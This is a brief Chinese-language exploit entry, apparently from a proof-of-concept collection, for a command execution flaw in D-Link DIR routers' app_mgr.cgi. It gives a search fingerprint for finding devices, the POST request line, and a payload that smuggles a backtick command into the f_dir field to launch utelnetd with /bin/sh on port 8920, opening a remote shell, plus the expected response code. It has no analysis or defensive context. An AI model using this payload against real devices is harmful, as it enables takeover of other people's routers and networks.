# D-Linkapp_mgr.cgi存在命令执行漏洞

D-Linkapp_mgr.cgi ｜ 命令执行 ｜ —
- **指纹**：`"D-Link-DIR"`
- **请求**：`POST /cgi-bin/app\_mgr.cgi HTTP/1.1`

**Payload**
```
cmd=cgi\_refresh\_db\&f\_dir=`utelnetd -p 8920 -l /bin/sh`\&f\_function=
```
- **响应特征**：200